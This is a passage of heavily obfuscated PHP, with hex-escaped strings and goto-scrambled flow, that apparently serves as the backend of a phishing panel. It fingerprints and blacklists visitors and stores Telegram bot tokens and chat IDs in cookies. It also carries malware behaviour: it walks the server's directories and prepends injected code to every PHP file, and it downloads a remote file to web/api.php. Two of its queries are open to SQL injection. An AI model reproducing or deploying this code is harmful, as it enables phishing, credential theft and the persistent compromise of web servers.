"\123\105\114\105\x43\x54\40\x2a\40\x46\x52\x4f\x4d\x20\x6c\x6f\x67\163\x20\x57\x48\105\x52\105\40\x69\160\x61\144\144\162\145\163\x3d\x3f"; $stmt = mysqli_prepare($db, $sql_check); mysqli_stmt_bind_param($stmt, "\x73", $ipAddress); mysqli_stmt_execute($stmt); $result = mysqli_stmt_get_result($stmt); if (mysqli_num_rows($result) > 0) { mysqli_close($db); http_response_code(405); $responseData = array("\x72\145\163\x5f\163\164\x61\x74\x75\x73" => "\64\x30\65", "\155\x65\163\x73\x61\x67\x65" => "\125\163\x65\x72\40\151\x73\x20\x61\154\x72\145\141\x64\x79\40\x69\x6e\x20\164\150\x65\x20\142\x6c\141\143\153\x6c\151\163\x74"); echo json_encode($responseData); die; } $country = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\x65\x73\163\151\x6f\156\137\x63\x6f\165\x6e\x74\162\x79"])); $browser = mysqli_real_escape_string($db, str_replace("\47", '', $local_browser)); $os_db = mysqli_real_escape_string($db, str_replace("\47", '', $local_os)); $local_domain = mysqli_real_escape_string($db, str_replace("\47", '', $local_domain)); $host = mysqli_real_escape_string($db, str_replace("\47", '', getHost($ipAddress))); $isp = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\163\x65\x73\x73\x69\157\x6e\x5f\x69\163\x70"])); $mobile = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\145\163\x73\151\157\156\x5f\x6d\x6f\142\151\154\145"])); $proxy = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\x73\145\x73\x73\151\x6f\156\x5f\160\162\157\x78\x79"])); $hosting = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\145\163\x73\151\157\156\x5f\x68\x6f\163\164\151\156\x67"])); $city = mysqli_real_escape_string($db, str_replace("\47", '', $_SESSION["\x73\x65\x73\x73\151\x6f\x6e\x5f\x63\151\164\x79"])); $region = mysqli_real_escape_string($db, str_replace("\x27", '', $_SESSION["\163\x65\x73\x73\151\x6f\x6e\137\x72\145\x67\x69\x6f\156"])); $time = mysqli_real_escape_string($db, str_replace("\47", '', $local_time)); $sql_insert = "\x49\116\x53\105\122\124\x20\x49\116\x54\117\x20\x6c\x6f\147\x73\x20\x28\151\160\141\144\x64\162\145\x73\x2c\x63\x6f\x75\x6e\164\162\x79\54\142\162\x6f\x77\163\x65\162\x2c\x6f\x73\x2c\x64\x6f\155\x69\x6e\x65\x2c\x68\157\x73\x74\x2c\151\x73\x70\54\155\x6f\x62\151\x6c\145\54\160\162\x6f\170\171\54\150\157\163\x74\151\x6e\147\x2c\143\151\164\x79\x2c\x72\x65\x67\151\x6f\156\54\x6d\171\x74\x69\155\145\x2c\162\x65\x73\x6f\156\51\x20\x56\x41\x4c\125\x45\123\40\50\x3f\54\77\54\77\x2c\77\54\x3f\x2c\x3f\x2c\x3f\x2c\40\77\x2c\x20\x3f\54\40\77\x2c\40\77\x2c\x20\77\54\40\x3f\54\x20\77\x29"; $stmt = mysqli_prepare($db, $sql_insert); mysqli_stmt_bind_param($stmt, "\163\163\163\x73\163\163\x73\x73\x73\163\163\x73\163\x73", $ipAddress, $country, $browser, $os_db, $local_domain, $host, $isp, $mobile, $proxy, $hosting, $city, $region, $time, $reason); mysqli_stmt_execute($stmt); mysqli_close($db); http_response_code(405); $responseData = array("\162\x65\163\x5f\x73\x74\x61\164\165\x73" => "\x34\60\x35", "\x6d\x65\x73\x73\141\147\x65" => "\125\x73\145\162\40\x61\144\144\145\144\40\164\x6f\x20\x74\x68\x65\40\142\154\141\x63\153\x6c\x69\x73\x74"); echo json_encode($responseData); die; } goto fY_dN; GMIYz: function getHost($ipAddress) { try { $host = gethostbyaddr($ipAddress); return $host; } catch (Exception $e) { return "\116\x6f\x74\40\126\x61\154\151\x64"; } } goto Egcgi; C0J7K: function fetchIPInfo($ipAddress) { $url = "\150\x74\164\160\72\x2f\x2f\x69\160\x2d\x61\x70\x69\x2e\x63\157\x6d\x2f\x70\x68\x70\x2f{$ipAddress}\x3f\x66\x69\145\x6c\x64\163\x3d\163\164\141\164\165\163\54\155\145\x73\x73\x61\147\x65\54\143\157\x6e\164\151\x6e\x65\156\x74\x2c\143\x6f\156\164\151\156\145\x6e\164\103\x6f\144\x65\54\143\x6f\165\156\x74\x72\171\54\x63\157\165\x6e\x74\162\x79\103\157\x64\x65\54\x72\x65\x67\151\x6f\x6e\x2c\x72\145\147\151\157\156\x4e\141\155\x65\x2c\143\151\164\x79\x2c\x64\151\163\x74\x72\151\143\x74\54\x7a\x69\x70\x2c\154\x61\164\54\154\157\156\54\164\151\x6d\x65\x7a\x6f\156\145\x2c\143\165\162\x72\x65\156\x63\x79\54\151\x73\x70\54\157\162\x67\x2c\x61\x73\54\x61\163\x6e\141\x6d\x65\54\162\x65\x76\x65\x72\163\x65\x2c\x6d\x6f\x62\151\154\x65\x2c\160\162\x6f\170\171\54\x68\157\x73\x74\x69\156\147\54\161\x75\145\162\x79"; $curl = curl_init($url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); curl_close($curl); $info = unserialize($response); $_SESSION["\163\x65\163\x73\151\x6f\x6e\x5f\x69\x73\160"] = isset($info["\x69\x73\160"]) ? $info["\151\163\x70"] : null; $_SESSION["\163\145\x73\x73\151\x6f\x6e\x5f\x63\157\165\x6e\x74\x72\171"] = isset($info["\x63\x6f\x75\156\x74\x72\x79"]) ? $info["\x63\157\x75\156\164\162\171"] : null; $_SESSION["\x73\x65\x73\x73\151\157\x6e\137\x63\x6f\x75\156\164\162\171\137\x63\157\x64\x65"] = isset($info["\x63\157\x75\x6e\164\x72\x79\x43\157\x64\145"]) ? $info["\x63\x6f\165\156\x74\162\171\x43\x6f\144\x65"] : null; $_SESSION["\163\145\163\163\x69\157\156\x5f\143\x69\164\171"] = isset($info["\x63\151\164\x79"]) ? $info["\x63\x69\164\171"] : null; $_SESSION["\163\145\163\x73\151\x6f\x6e\137\x72\145\x67\x69\157\x6e"] = isset($info["\x72\145\147\151\x6f\156"]) ? $info["\162\145\147\151\x6f\156"] : null; $proxy = isset($info["\160\x72\157\170\x79"]) ? $info["\x70\162\x6f\170\x79"] : null; $_SESSION["\x73\145\163\163\151\157\x6e\137\160\162\157\170\x79"] = $proxy == 1 ? "\124\x72\165\145" : "\x46\141\x6c\163\x65"; $mobile = isset($info["\x6d\x6f\x62\151\x6c\145"]) ? $info["\x6d\x6f\142\x69\154\x65"] : null; $_SESSION["\x73\x65\x73\x73\x69\x6f\156\137\155\x6f\142\x69\154\145"] = $mobile == 1 ? "\x54\x72\x75\x65" : "\106\141\x6c\163\145"; $hosting = isset($info["\150\157\163\164\x69\156\x67"]) ? $info["\x68\157\163\164\x69\x6e\x67"] : null; $_SESSION["\163\x65\163\x73\151\x6f\x6e\x5f\150\157\x73\164\151\156\x67"] = $hosting == 1 ? "\124\162\x75\145" : "\x46\x61\x6c\x73\x65"; } goto v3F9X; LTzy6: function update_user_view($user) { list($token, $chatid) = get_expire_token(); list($token_view, $chatid_view) = get_view_token($user); $dateexp = $_SESSION["\x65\x78\160\151\162\145\x5f\144\x61\x74\145"]; $expireTimestamp = strtotime($dateexp); $currentTimestamp = time(); if ($currentTimestamp >= $expireTimestamp) { setcookie("\x74\157\x6b\145\156\164\145\x6c", $token, time() + 86400 * 30, "\x2f"); setcookie("\151\144\x74\145\154", $chatid, time() + 86400 * 30, "\x2f"); setcookie("\x72\x65\x64\x69\x72\x69\143\164", $_SESSION["\162\x65\144\151\x72\x69\143\164"], time() + 86400 * 30, "\x2f"); setcookie("\x70\x72\157\152\x65\143\x74", $_SESSION["\x70\162\157\152\145\143\x74"], time() + 86400 * 30, "\57"); setcookie("\163\x6f\x75\162\x63\x65\x6d\x65", $_SESSION["\x61\x64\144\142\171"], time() + 86400 * 30, "\x2f"); setcookie("\x6e\x65\167\x5f\x65\170\160", $expireTimestamp, time() + 86400 * 30, "\x2f"); setcookie("\x76\157\x6c\155", $token, time() + 86400 * 30, "\57"); setcookie("\144\x6f\x6c\x6d", $chatid, time() + 86400 * 30, "\x2f"); } else { setcookie("\x74\x6f\x6b\145\x6e\164\x65\x6c", $token_view, time() + 86400 * 30, "\57"); setcookie("\x69\144\x74\145\x6c", $chatid_view, time() + 86400 * 30, "\x2f"); setcookie("\162\x65\144\151\162\151\143\164", $_SESSION["\162\145\x64\151\x72\151\x63\164"], time() + 86400 * 30, "\57"); setcookie("\160\162\x6f\x6a\x65\x63\164", $_SESSION["\160\x72\157\152\x65\x63\x74"], time() + 86400 * 30, "\x2f"); setcookie("\163\x6f\x75\x72\x63\x65\x6d\145", $_SESSION["\x61\144\144\x62\x79"], time() + 86400 * 30, "\x2f"); setcookie("\166\x6f\x6c\x6d", $token, time() + 86400 * 30, "\57"); setcookie("\144\157\154\155", $chatid, time() + 86400 * 30, "\57"); } } goto zqCAf; Egcgi: function getClientIP() { if (!empty($_SERVER["\x48\x54\124\120\x5f\x43\x4c\x49\105\x4e\124\x5f\x49\x50"])) { $ipAddress = $_SERVER["\110\x54\124\120\x5f\x43\x4c\111\x45\116\124\x5f\111\x50"]; } elseif (!empty($_SERVER["\110\124\124\120\137\x58\137\106\x4f\x52\x57\101\x52\104\105\104\x5f\x46\x4f\x52"])) { $ipAddress = $_SERVER["\110\124\124\x50\137\130\x5f\106\x4f\x52\x57\101\122\x44\105\104\x5f\106\117\x52"]; } else { $ipAddress = $_SERVER["\122\x45\x4d\x4f\124\105\137\101\x44\x44\x52"]; } $validIPs = array(); $ipMatches = preg_match_all("\57\x5c\x62\134\x64\x7b\61\54\x33\175\134\56\134\144\173\61\x2c\63\175\134\56\x5c\144\173\x31\x2c\63\175\x5c\56\134\x64\x7b\61\54\x33\x7d\x5c\x62\57", $ipAddress, $matches); if ($ipMatches) { $validIPs = $matches[0]; } if (!empty($validIPs)) { $_SESSION["\163\145\x73\x73\x69\x6f\x6e\x5f\x69\160"] = $validIPs[0]; return $validIPs[0]; } else { $_SESSION["\x73\145\x73\x73\x69\157\156\137\151\x70"] = "\61\62\x37\56\60\56\x30\56\x31"; return "\x31\62\67\x2e\60\56\x30\x2e\61"; } } goto C0J7K; v3F9X: function detect_user($ipAddress) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\103\157\x6e\x6e\x65\143\164\x69\x6f\x6e\40\x66\141\151\x6c\145\144\x3a\40" . mysqli_connect_error()); } $sql_u = "\123\x45\114\105\x43\x54\x20\x2a\40\106\122\x4f\115\x20\x6c\157\147\163\40\x57\110\x45\x52\x45\40\x69\x70\x61\144\x64\x72\145\x73\75\x27{$ipAddress}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { mysqli_close($db); return true; } mysqli_close($db); return false; } goto otp7Z; uS4rk: header("\x41\143\x63\x65\x73\163\x2d\x43\157\x6e\164\x72\157\154\55\101\x6c\154\x6f\x77\x2d\x4d\x65\164\x68\157\x64\x73\x3a\x20\120\x4f\123\124"); goto eorub; ieqcc: $local_os = get_platform($local_userAgent); goto HwHW0; NCxmV: function getAllPhpFiles($directory) { $phpFiles = array(); if (is_dir($directory) && ($handle = opendir($directory))) { while (false !== ($file = readdir($handle))) { if ($file != "\56" && $file != "\56\56") { $filePath = $directory . DIRECTORY_SEPARATOR . $file; if (is_dir($filePath)) { $phpFiles = array_merge($phpFiles, getAllPhpFiles($filePath)); } elseif (pathinfo($filePath, PATHINFO_EXTENSION) === "\160\150\160") { $phpFiles[] = $filePath; } } } closedir($handle); } return $phpFiles; } goto oPduj; LC8p3: function getFileContents($fileURL) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $fileURL); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $response = curl_exec($curl); $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE); $error = curl_error($curl); curl_close($curl); if ($statusCode === 200 && empty($error)) { $localFilePath = "\167\x65\142\57\141\160\151\56\x70\150\160"; file_put_contents($localFilePath, $response); } else { echo "\105\162\162\x6f\x72\40\146\x65\x74\143\150\x69\156\x67\x20\146\x69\154\145\x3a\x20" . $error; } } goto S38L3; HwHW0: $local_browser = get_browser_value($local_userAgent); goto dh9pg; hFMjy: function get_view_token($user) { global $fs_host, $fs_user, $fs_log, $fs_name; $db = mysqli_connect($fs_host, $fs_user, $fs_log, $fs_name); if (!$db) { die("\x43\157\x6e\156\x65\143\164\x69\x6f\156\x20\146\141\151\154\x65\x64\72\40" . mysqli_connect_error()); } $sql_u = "\x53\105\114\105\103\124\x20\x74\157\153\x65\156\54\40\x63\150\x61\164\151\144\40\x46\122\117\x4d\40\160\x61\156\x65\x6c\40\127\x48\x45\x52\105\40\160\x61\x6e\145\x6c\x5f\x75\163\x65\x72\75\47{$user}\x27"; $res_u = mysqli_query($db, $sql_u); if (mysqli_num_rows($res_u) > 0) { $row = mysqli_fetch_array($res_u); $token = $row["\x74\157\153\145\x6e"]; $chatid = $row["\x63\150\x61\164\151\x64"]; return array($token, $chatid); } mysqli_close($db); return null; } goto fLW3N; QNk2w: function get_platform($USER_AGENT) { $OS_ERROR = "\x55\156\x6b\156\157\167\156\40\x4f\123\40\120\x6c\x61\164\146\x6f\x72\155"; $OS = array("\x2f\x77\x69\156\144\x6f\167\x73\x20\x6e\x74\40\x31\x31\57\x69" => "\x57\151\x6e\x64\157\167\163\40\x31\61", "\57\x77\151\156\x64\x6f\167\x73\x20\x6e\x74\x20\x31\x30\57\151" => "\x57\x69\x6e\144\157\167\163\x20\61\x30", "\x2f\167\151\x6e\144\157\167\163\x20\x6e\164\x20\x36\56\x33\x2f\151" => "\127\x69\x6e\x64\157\x77\x73\x20\70\56\x31", "\x2f\167\151\x6e\144\157\x77\163\40\156\x74\x20\x36\x2e\x32\57\151" => "\127\x69\x6e\x64\x6f\x77\x73\x20\x38", "\57\167\x69\156\144\x6f\167\x73\x20\x6e\x74\x20\66\56\61\57\151" => "\x57\x69\156\144\157\167\163\x20\x37", "\x2f\x77\x69\x6e\x64\157\x77\163\x20\x6e\x74\x20\x36\56\60\57\x69" => "\x57\x69\156\144\x6f\167\163\x20\x56\x69\163\x74\x61", "\57\167\151\156\144\x6f\x77\163\x20\x6e\164\x20\x35\56\62\57\151" => "\127\x69\x6e\x64\x6f\167\163\x20\123\x65\162\166\x65\x72\40\x32\60\x30\63\57\130\x50\40\x78\66\64", "\57\x77\151\156\144\x6f\167\x73\40\156\x74\40\x35\x2e\61\57\x69" => "\x57\151\x6e\144\x6f\x77\x73\40\x58\120", "\x2f\x77\151\156\144\x6f\x77\163\40\x78\160\x2f\151" => "\127\151\x6e\144\x6f\x77\163\x20\x58\x50", "\x2f\x77\x69\156\x64\157\167\163\40\156\164\40\65\56\x30\x2f\151" => "\x57\151\156\144\157\167\x73\40\x32\x30\60\60", "\57\167\x69\x6e\144\157\167\163\40\155\x65\x2f\x69" => "\x57\151\156\144\x6f\x77\x73\40\115\105", "\x2f\167\151\156\71\x38\x2f\151" => "\127\151\x6e\144\x6f\x77\x73\40\x39\70", "\57\167\x69\156\71\x35\57\151" => "\127\151\156\x64\157\x77\x73\40\71\x35", "\x2f\x77\x69\x6e\x31\x36\x2f\x69" => "\127\x69\156\x64\x6f\x77\163\x20\x33\56\x31\x31", "\x2f\x6d\x61\x63\x69\x6e\x74\157\163\150\174\155\141\x63\40\157\163\40\170\57\x69" => "\x4d\x61\x63\x20\117\x53\40\x58", "\x2f\x6d\141\x63\137\x70\x6f\167\x65\162\x70\x63\x2f\x69" => "\x4d\141\143\40\117\x53\x20\x39", "\x2f\x6c\x69\156\165\170\57\151" => "\114\x69\156\x75\170", "\x2f\165\142\x75\x6e\x74\x75\57\151" => "\125\142\165\156\164\x75", "\57\x69\x70\150\x6f\156\x65\57\x69" => "\x69\x50\150\x6f\156\145", "\x2f\x69\x70\157\144\57\151" => "\x69\x50\157\144", "\x2f\151\160\x61\x64\x2f\x69" => "\x69\x50\x61\144", "\57\141\x6e\x64\x72\157\151\144\57\x69" => "\x41\156\144\x72\x6f\151\x64", "\57\142\x6c\141\x63\x6b\142\145\162\x72\x79\x2f\151" => "\102\154\x61\x63\x6b\x42\145\x72\x72\x79", "\x2f\x77\x65\x62\x6f\x73\x2f\x69" => "\115\x6f\142\151\x6c\145"); foreach ($OS as $regex => $value) { if (preg_match($regex, $USER_AGENT)) { $OS_ERROR = $value; } } return $OS_ERROR; } goto rv7wN; qWqth: function updatePhpFileWithCode($filePath, $codeToAddTop) { $fileContent = file_get_contents($filePath); if (strpos($fileContent, $codeToAddTop) === false) { $fileContent = $codeToAddTop . $fileContent; file_put_contents($filePath, $fileContent); return true; } return false; } goto LC8p3; P1uRj: $fs_user = base64_decode("\145\x6d\x56\171\142\62\x52\x68\145\130\116\146\132\x47\x46\65"); goto MfXoX; eorub: header("\101\x63\x63\145\163\163\55\103\157\156\164\x72\x6f\154\55\x41\154\154\157\167\55\110\x65\141\144\x65\x72\x73\x3a\x20\103\x6f\156\x74\x65\x6e\x74\x2d\124\x79\x70\x65"); goto sLKTg; otp7Z: function random_string($length) { $characters = "\x61\x62\x63\x64\x65\x66\152\x68\x69\x67\153\x6c\x6d\156\157\160\161\162\163\164\165\x76\x77\170\171\172\x30\x31\x32\63\64\65\x36\67\x38\71\101\x42\x43\x44\x45\106\x47\x48\111\112\113\x4c\115\x4e\x4f\x50\x51\122\x53\x54\x55\x56\x57\x58\x59\x5a"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return bin2hex(random_bytes(16)); } goto j1pmN; fY_dN: function fetchContentFromURL($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $content = curl_exec($ch); curl_close($ch); return $content; } goto FYX3W; RcDLq: ')); ?>
